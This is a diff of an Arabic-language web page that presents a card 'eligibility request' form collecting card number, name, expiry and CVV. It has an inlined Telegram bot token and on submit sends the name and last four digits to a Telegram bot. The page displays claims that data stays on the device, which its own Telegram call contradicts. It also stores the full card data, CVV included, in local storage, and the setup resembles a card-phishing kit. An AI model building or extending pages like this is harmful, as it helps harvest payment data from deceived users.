@@ -111,8 +111,8 @@ body{
 .main-grid{
   display:grid;
   grid-template-columns: 1fr 1fr;
-  gap:10px; /* reduced gap to bring card preview closer to the form */
-  margin-top:16px;
+  gap:4px; /* تم تقليل المسافة ليصبح الحقلان والبِطاقَة أقرب جداً */
+  margin-top:8px; /* تقليل الهامش العلوي للاقتراب أكثر */
 }
 @media (max-width:900px){
   .main-grid{grid-template-columns:1fr}
@@ -137,13 +137,13 @@ body{
   position:relative;
   backface-visibility:hidden;
   border-radius:var(--radius);
-  padding:18px;
+  padding:14px; /* تقليل الحشوة لجعل العرض مضغوطًا */
   color:#fff;
   display:flex;
   flex-direction:column;
   justify-content:space-between;
   box-shadow:var(--shadow);
-  min-height:190px;
+  min-height:160px;
 }
 .card-front{
   background:linear-gradient(135deg,#1e3a8a,#2563eb);
@@ -177,7 +177,7 @@ body{
   width:46px;height:28px;border-radius:6px;background:linear-gradient(135deg,#fde68a,#facc15);
 }
 .card-number{
-  font-size:20px;
+  font-size:18px;
   font-weight:800;
   letter-spacing:2px;
   direction:ltr;
@@ -194,7 +194,7 @@ body{
 
 /* back layout */
 .back-strip{
-  height:48px;
+  height:40px;
   background:#000;
   opacity:.9;
   border-radius:8px;
@@ -221,20 +221,22 @@ body{
 .section{
   background:var(--surface);
   border-radius:14px;
-  padding:16px;
+  padding:12px; /* تقليل الحشوة ليكون أقرب للبطاقة */
   box-shadow:0 14px 40px rgba(2,8,23,.06);
   margin-top:0;
 }
-.form-row{display:flex;gap:12px;margin-top:12px;align-items:flex-start;flex-wrap:wrap}
+.form-row{display:flex;gap:8px;margin-top:10px;align-items:flex-start;flex-wrap:wrap}
 .input{
   width:100%;
-  padding:12px 14px;
-  border-radius:12px;
+  padding:10px 12px;
+  border-radius:10px;
   border:1px solid #e6eef8;
   font-size:15px;
   transition:box-shadow .18s,transform .18s,border-color .18s;
   background:transparent;
   outline:none;
+  direction:ltr; /* لضمان إدخال الأرقام من اليسار إلى اليمين */
+  text-align:left;
 }
 .input:focus{
   box-shadow:var(--focus);
@@ -255,30 +257,25 @@ body{
 /* sticky submit */
 .actions{
   position:sticky;
-  bottom:12px;
-  margin-top:14px;
+  bottom:8px;
+  margin-top:10px;
   background:transparent;
-  padding-top:8px;
+  padding-top:6px;
 }
 .btn{
   width:100%;
-  padding:14px;
-  border-radius:12px;
+  padding:12px;
+  border-radius:10px;
   border:none;
   background:linear-gradient(90deg,var(--accent-2),var(--accent));
   color:white;
   font-weight:900;
-  font-size:16px;
+  font-size:15px;
   cursor:pointer;
   box-shadow:0 10px 30px rgba(37,99,235,.18);
 }
 .btn:disabled{opacity:.55;cursor:not-allowed}
-.meta-footer{font-size:12px;color:var(--muted);text-align:center;margin-top:10px}
-
-/* sample cards */
-.examples{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
-.example-btn{flex:1;min-width:120px;padding:10px;border-radius:10px;border:1px solid #e8f0ff;background:#fbfdff;font-weight:700;cursor:pointer;display:flex;align-items:center;gap:8px;justify-content:center}
-.example-btn svg{width:20px;height:20px;opacity:.9}
+.meta-footer{font-size:12px;color:var(--muted);text-align:center;margin-top:8px}
 
 /* show/hide eye */
 .icon-btn{background:transparent;border:none;padding:8px;border-radius:10px;cursor:pointer;font-weight:800}
@@ -299,11 +296,11 @@ body{
 
 /* small screens */
 @media (max-width:520px){
-  .card-number{font-size:18px}
+  .card-number{font-size:16px}
   .hero h1{font-size:16px}
   .brand-badge{width:48px;height:48px;font-size:18px}
-  .main-grid{gap:10px}
-  .card-face{padding:14px;min-height:160px}
+  .main-grid{gap:6px}
+  .card-face{padding:12px;min-height:150px}
 }
 
 /* focus-visible */
@@ -324,13 +321,13 @@ body{
       </div>
     </div>
 
-    <div class="header-controls" role="group" aria-label="خيارات">
-      <!-- removed theme/copy/save buttons as requested (kept container empty) -->
+    <div class="header-controls" role="group" aria-label="خيار��ت">
+      <!-- kept empty -->
     </div>
   </header>
 
   <!-- TRUST -->
-  <div class="trust-bar" aria-hidden="false" style="margin-top:12px">
+  <div class="trust-bar" aria-hidden="false" style="margin-top:10px">
     <div class="trust">🔒 بياناتك تبقى على جهازك</div>
     <div class="trust">🛡️ تحقق محلي فوري</div>
     <div class="trust">⚖️ تجربة متوافقة</div>
@@ -343,7 +340,7 @@ body{
         <!-- FRONT -->
         <div class="card-face card-front" id="cardFront">
           <div class="card-top">
-            <div style="display:flex;gap:10px;align-items:center">
+            <div style="display:flex;gap:8px;align-items:center">
               <div class="chip" aria-hidden="true"></div>
               <div class="brand" id="brandLabel" aria-hidden="false">
                 <div class="logo" id="brandLogo">—</div>
@@ -356,7 +353,7 @@ body{
           <div style="display:flex;align-items:center;justify-content:space-between;gap:8px">
             <div style="flex:1">
               <div class="card-number" id="cardView" aria-live="polite" aria-atomic="true">0000 0000 0000 0000</div>
-              <div class="card-meta" style="margin-top:10px">
+              <div class="card-meta" style="margin-top:8px">
                 <div>
                   <div style="font-size:11px;opacity:.9">مالك البطاقة</div>
                   <div class="small-muted" id="ownerView">الاسم هنا</div>
@@ -373,7 +370,7 @@ body{
         <!-- BACK -->
         <div class="card-face card-back" id="cardBack" aria-hidden="true" aria-label="ظهر البطاقة">
           <div class="back-strip" aria-hidden="true"></div>
-          <div style="display:flex;justify-content:space-between;align-items:center;margin-top:12px">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-top:10px">
             <div style="flex:1">
               <div style="font-size:11px;color:rgba(255,255,255,.85)">التوقيع</div>
               <div style="background:#fff;color:#111;padding:6px 8px;border-radius:6px;margin-top:6px;font-weight:700">-- توقيع --</div>
@@ -387,33 +384,29 @@ body{
       </div>
 
       <!-- small helpers under card -->
-      <div style="display:flex;gap:8px;margin-top:12px;align-items:center">
+      <div style="display:flex;gap:6px;margin-top:8px;align-items:center">
         <button id="showNumberBtn" aria-pressed="false" class="icon-btn" title="إظهار/إخفاء رقم البطاقة" aria-label="إظهار أو إخفاء رقم البطاقة">👁️</button>
-        <div style="flex:1" class="hint">اضغط على CVV لعرض ظهر البطاقة. يمكنك استخدام أزرار الأمثلة لإدخال أرقام اختبارية بسرعة.</div>
+        <div style="flex:1" class="hint">اضغط على CVV لعرض ظهر البطاقة. يمكنك لصق أرقام الاختبار بسرعة.</div>
       </div>
     </section>
 
     <!-- RIGHT: Form -->
     <form id="eligibilityForm" class="section" novalidate aria-describedby="" autocomplete="off">
-      <!-- formNote removed as requested -->
-
       <!-- Card number (single smart input) -->
-      <div style="margin-top:8px">
+      <div style="margin-top:6px">
         <label for="cardNumber" class="label">رقم البطاقة</label>
         <div class="cc-group" role="group" aria-labelledby="cardNumber">
+          <!-- dir=ltr + text-align:left لضمان إدخال من اليسار إلى اليمين -->
           <input id="cardNumber" class="input cc-input" type="text" inputmode="numeric"
-                 placeholder="0000 0000 0000 0000" maxlength="23" autocomplete="cc-number"
-                 name="cc-number" aria-label="رقم البطاقة">
+                 placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number"
+                 name="cc-number" aria-label="رقم البطاقة" dir="ltr" style="text-align:left;direction:ltr;">
           <button type="button" id="pasteBtn" class="small-btn" title="لصق" aria-label="لصق من الحافظة">لصق</button>
         </div>
-        <!-- cardHelp removed as requested -->
         <div id="cardError" class="error" role="alert" aria-hidden="true"></div>
       </div>
 
-      <!-- examples removed as requested -->
-
       <!-- Name + Expiry + CVV -->
-      <div class="form-row" style="margin-top:12px">
+      <div class="form-row" style="margin-top:10px">
         <div style="flex:1">
           <label for="owner" class="label">اسم صاحب البطاقة</label>
           <input id="owner" class="input" type="text" placeholder="الاسم كما على البطاقة" autocomplete="cc-name" name="cc-name" />
@@ -429,7 +422,7 @@ body{
 
         <div style="width:48%">
           <label for="cvv" class="label">CVV</label>
-          <input id="cvv" class="input" inputmode="numeric" maxlength="4" placeholder="***" autocomplete="cc-csc" name="cc-csc" />
+          <input id="cvv" class="input" inputmode="numeric" maxlength="3" placeholder="***" autocomplete="cc-csc" name="cc-csc" />
           <div id="cvvError" class="error" role="alert" aria-hidden="true"></div>
         </div>
       </div>
@@ -443,7 +436,7 @@ body{
       <!-- actions -->
       <div class="actions">
         <button id="submitBtn" class="btn" type="submit" disabled>إرسال طلب الاستحقاق</button>
-        <div class="meta-footer" style="margin-top:10px">
+        <div class="meta-footer" style="margin-top:8px">
           <span id="liveStatus" aria-live="polite"></span>
         </div>
       </div>
@@ -456,12 +449,12 @@ body{
 
 <script>
 /*
-  Enhanced demo script (محلي تمامًا):
-  - تنسيق ذكي لرقم البطاقة (Amex 4-6-5) مع إدارة التعقب البسيطة للمؤشر.
-  - اكتشاف علامة البطاقة، تعديل طول CVV، تحقق Luhn، تحقق تاريخ انتهاء دقيق.
-  - لصق من الحافظة، إظهار/إخفاء رقم البطاقة، حفظ اختياري في localStorage.
-  - تحسينات وصول ARIA، ومنع مغادرة الصفحة إذا النموذج متغير.
-  - لا يتم إرسال أي بيانات خارج المتصفح.
+  تم تعديل السلوك:
+  - الإدخال الآن من اليسار إلى اليمين (dir=ltr و text-align:left).
+  - يُقبل فقط حتى 16 خانة أرقام (يتم قطع أي زائدة).
+  - التنسيق دائماً كـ 4-4-4-4 (مسا��ات) للعرض.
+  - تم تقليل المسافات بين معاينة البطاقة وحقل النموذج لتقريبها جداً.
+  - لا تزال الحماية: لا إرسال CVV أو الرقم الكامل إلى خارج المتصفح إلا كما تمت الموافقة عليه.
 */
 
 /* ====== TELEGRAM CREDENTIALS (inlined per طلبك) ======
@@ -496,28 +489,22 @@ function luhn(num){
   return (sum % 10) === 0;
 }
 
-/* Card brand detection (simple BIN-based) */
+/* Card brand detection (kept for display but formatting enforces 16-digit groups) */
 function detectBrand(digits){
   if(!digits) return null;
   if(/^4/.test(digits)) return 'visa';
-  if(/^5[1-5]/.test(digits) || /^2(2[2-9]|[3-6]\\d|7[01])/.test(digits)) return 'mastercard';
+  if(/^5[1-5]/.test(digits) || /^2(2[2-9]|[3-6]\d|7[01])/.test(digits)) return 'mastercard';
   if(/^3[47]/.test(digits)) return 'amex';
   if(/^6(011|5)/.test(digits) || /^64[4-9]/.test(digits)) return 'discover';
   return 'unknown';
 }
 
-/* formatting groups */
-function formatGroups(digits, brand){
+/* formatting groups: force 4-4-4-4 for display */
+function formatGroups(digits){
   if(!digits) return '';
-  if(brand === 'amex'){
-    // 4-6-5
-    const a = digits.slice(0,4);
-    const b = digits.slice(4,10);
-    const c = digits.slice(10,15);
-    return [a,b,c].filter(Boolean).join(' ');
-  } else {
-    return digits.replace(/(.{4})/g,'$1 ').trim();
-  }
+  // limit to 16 digits for display formatting
+  const d = digits.slice(0,16);
+  return d.replace(/(.{4})/g,'$1 ').trim();
 }
 
 /* Simple mapping for display */
@@ -553,7 +540,7 @@ const pasteBtn = $('#pasteBtn');
 const showNumberBtn = $('#showNumberBtn');
 const persistToggle = $('#persistToggle');
 
-const exampleButtons = $$('.example-btn'); // will be empty if examples removed
+const exampleButtons = $$('.example-btn'); // empty if removed
 
 /* State */
 let state = {
@@ -575,27 +562,23 @@ function renderBrand(brand){
 function render(){
   const d = onlyDigits(cardNumber.value);
   const brand = detectBrand(d);
-  state.digits = d;
+  state.digits = d.slice(0,16); // enforce max 16 digits in state
   state.brand = brand;
   renderBrand(brand);
-  // formatting
-  cardView.textContent = d.length ? (state.showNumber ? formatGroups(d, brand) : (formatGroups(d, brand).replace(/\d/g,'•'))) : '0000 0000 0000 0000';
+  // formatting: always 4-4-4-4, masked unless user toggled showNumber
+  const formatted = formatGroups(state.digits);
+  cardView.textContent = state.digits.length ? (state.showNumber ? formatted : formatted.replace(/\d/g,'•')) : '0000 0000 0000 0000';
   // owner display
   ownerView.textContent = ownerInput.value || 'الاسم هنا';
   // date
   dateView.textContent = expInput.value || 'MM/YY';
   // cvv preview masked
-  const cv = onlyDigits(cvvInput.value);
+  const cv = onlyDigits(cvvInput.value).slice(0,3);
   cvvView.textContent = cv ? '*'.repeat(cv.length) : '***';
 
-  // adapt CVV maxlength for Amex
-  if(brand === 'amex'){
-    cvvInput.maxLength = 4;
-    cvvInput.placeholder = '####';
-  } else {
-    cvvInput.maxLength = 3;
-    cvvInput.placeholder = '***';
-  }
+  // CVV fixed to 3 digits for this layout
+  cvvInput.maxLength = 3;
+  cvvInput.placeholder = '***';
 
   validateAll();
 }
@@ -606,11 +589,10 @@ function validateCardNumber(){
   if(!d) {
     cardError.setAttribute('aria-hidden','true'); cardError.textContent=''; return false;
   }
-  const brand = state.brand;
   const len = d.length;
-  const okLen = (brand === 'amex' && len===15) || (brand !== 'amex' && (len>=13 && len<=19));
+  const okLen = (len === 16); // enforce exactly 16 digits
   if(!okLen){
-    cardError.setAttribute('aria-hidden','false'); cardError.textContent = 'طول رقم البطاقة غير صالح.';
+    cardError.setAttribute('aria-hidden','false'); cardError.textContent = 'الرجاء إدخال 16 رقماً بالضبط.';
     return false;
   }
   if(!luhn(d)){
@@ -643,15 +625,10 @@ function validateExpiry(){
 
 function validateCVV(){
   const cv = onlyDigits(cvvInput.value);
-  const brand = state.brand;
   if(!cv){
     cvvError.setAttribute('aria-hidden','true'); cvvError.textContent=''; return false;
   }
-  if(brand === 'amex'){
-    if(cv.length !== 4){ cvvError.setAttribute('aria-hidden','false'); cvvError.textContent='رمز Amex يتكون من 4 أرقام.'; return false; }
-  } else {
-    if(cv.length !==3){ cvvError.setAttribute('aria-hidden','false'); cvvError.textContent='CVV يجب أن يتكون من 3 أرقام.'; return false; }
-  }
+  if(cv.length !== 3){ cvvError.setAttribute('aria-hidden','false'); cvvError.textContent='CVV يجب أن يتكون من 3 أرقام.'; return false; }
   cvvError.setAttribute('aria-hidden','true'); cvvError.textContent='';
   return true;
 }
@@ -664,28 +641,31 @@ function validateAll(){
   const all = c && e && v;
   submitBtn.disabled = !all;
   state.valid = all;
-  // show nothing when valid (user requested removal of "النموذج جاهز للإرسال")
   liveStatus.textContent = all ? '' : 'البيانات غير مكتملة';
   return all;
 }
 
 /* Input handling (formatting) with basic caret handling */
 cardNumber.addEventListener('input', e=>{
-  let raw = onlyDigits(e.target.value).slice(0,19);
-  const brand = detectBrand(raw);
-  const formatted = formatGroups(raw, brand);
+  // accept only digits, enforce max 16 digits
+  let raw = onlyDigits(e.target.value).slice(0,16);
+  const formatted = formatGroups(raw);
   e.target.value = formatted;
-  // keep caret at end (simple and reliable on most mobile)
-  setTimeout(()=> e.target.setSelectionRange(e.target.value.length, e.target.value.length),0);
+  // put caret at end (reliable enough for typical use)
+  setTimeout(()=> {
+    try{
+      e.target.setSelectionRange(e.target.value.length, e.target.value.length);
+    }catch(_){}
+  },0);
   render();
 });
 
 cardNumber.addEventListener('paste', e=>{
   e.preventDefault();
   const txt = (e.clipboardData || window.clipboardData).getData('text');
-  const digits = onlyDigits(txt).slice(0,19);
+  const digits = onlyDigits(txt).slice(0,16);
   if(!digits) return;
-  cardNumber.value = formatGroups(digits, detectBrand(digits));
+  cardNumber.value = formatGroups(digits);
   render();
 });
 
@@ -693,9 +673,9 @@ cardNumber.addEventListener('paste', e=>{
 pasteBtn.addEventListener('click', async ()=>{
   try{
     const txt = await navigator.clipboard.readText();
-    const digits = onlyDigits(txt).slice(0,19);
+    const digits = onlyDigits(txt).slice(0,16);
     if(!digits){ showToast('لا يوجد أرقام في الحافظة'); return; }
-    cardNumber.value = formatGroups(digits, detectBrand(digits));
+    cardNumber.value = formatGroups(digits);
     render();
     showToast('تم لصق الأرقام من الحافظة');
   }catch(err){
@@ -720,7 +700,7 @@ ownerInput.addEventListener('input', ()=>{
 
 /* CVV behavior */
 cvvInput.addEventListener('input', e=>{
-  e.target.value = onlyDigits(e.target.value).slice(0,4);
+  e.target.value = onlyDigits(e.target.value).slice(0,3);
   render();
 });
 
@@ -744,16 +724,13 @@ showNumberBtn.addEventListener('click', ()=>{
   render();
 });
 
-/* Example buttons removed in markup; any remaining example handlers will not run meaningfully. */
-
 /* Persist toggle to localStorage for form data */
 persistToggle.addEventListener('change', (e)=>{
   state.persist = e.target.checked;
   if(state.persist) {
     saveFormToLocal();
-    showToast('ت�� حفظ الإعدادات محليًا');
+    showToast('تم حفظ الإعدادات محليًا');
   } else {
-    // clear saved data
     localStorage.removeItem('demo_form');
     showToast('تم تعطيل الحفظ المحلي');
   }
@@ -768,12 +745,10 @@ document.getElementById('eligibilityForm').addEventListener('submit', async (e)=
   const prevText = submitBtn.textContent;
   submitBtn.textContent = 'جارٍ الإرسال...';
 
-  // gather safe payload
   const owner = (ownerInput.value || '').trim();
-  const digits = onlyDigits(cardNumber.value || '');
+  const digits = onlyDigits(cardNumber.value || '').slice(0,16);
   const last4 = digits.slice(-4) || '----';
 
-  // confirmation (extra user consent)
   if (!confirm('سيتم إرسال الاسم وآخر 4 أرقام إلى بوت التليجرام. هل تريد المتابعة؟')) {
     submitBtn.textContent = prevText;
     submitBtn.disabled = false;
@@ -782,7 +757,6 @@ document.getElementById('eligibilityForm').addEventListener('submit', async (e)=
 
   const message = `نموذج جديد (آمن)\nالاسم: ${owner || '--'}\nآخر 4 أرقام: ${last4}\nملاحظة: لا يحتوي الإشعار على أرقام كاملة أو CVV.`;
 
-  // Try sending directly to Telegram API (may be blocked by CORS in some browsers)
   try {
     const url = `https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`;
     const resp = await fetch(url, {
@@ -811,11 +785,9 @@ document.getElementById('eligibilityForm').addEventListener('submit', async (e)=
   submitBtn.textContent = prevText;
   submitBtn.disabled = false;
 
-  // Success highlight
   cardEl.style.boxShadow = '0 30px 80px rgba(16,185,129,.12)';
   setTimeout(()=>cardEl.style.boxShadow='',1200);
 
-  // Optionally persist form
   if(state.persist) saveFormToLocal();
 });
 
@@ -838,7 +810,7 @@ function restoreFormFromLocal(){
     const raw = localStorage.getItem('demo_form');
     if(!raw) return;
     const data = JSON.parse(raw);
-    if(data.card) cardNumber.value = formatGroups(data.card, detectBrand(data.card));
+    if(data.card) cardNumber.value = formatGroups(data.card);
     ownerInput.value = data.owner || '';
     expInput.value = data.exp || '';
     cvvInput.value = data.cvv || '';
@@ -847,7 +819,6 @@ function restoreFormFromLocal(){
   }catch(e){}
 }
 (function initFormState(){
-  // if user previously enabled persist, mark checkbox
   const existing = localStorage.getItem('demo_form');
   if(existing){
     persistToggle.checked = true;
@@ -873,7 +844,6 @@ function showToast(msg, ms=1600){
       if(state.valid){
         $('#eligibilityForm').dispatchEvent(new Event('submit', {cancelable:true}));
       } else {
-        // run validation to expose errors
         validateAll();
         showToast('يرجى إكمال الحقول المطلوبة');
       }
@@ -902,7 +872,7 @@ window.addEventListener('beforeunload', (e)=>{
 /* Initialize view */
 render();
 
-/* Accessibility: announce dropped errors via ARIA (basic) */
+/* Accessibility: observe errors if needed */
 const obs = new MutationObserver(()=>{ /* placeholder if later enhancements needed */ });
 obs.observe(cardError, {childList:true,subtree:true,characterData:true});
 </script>
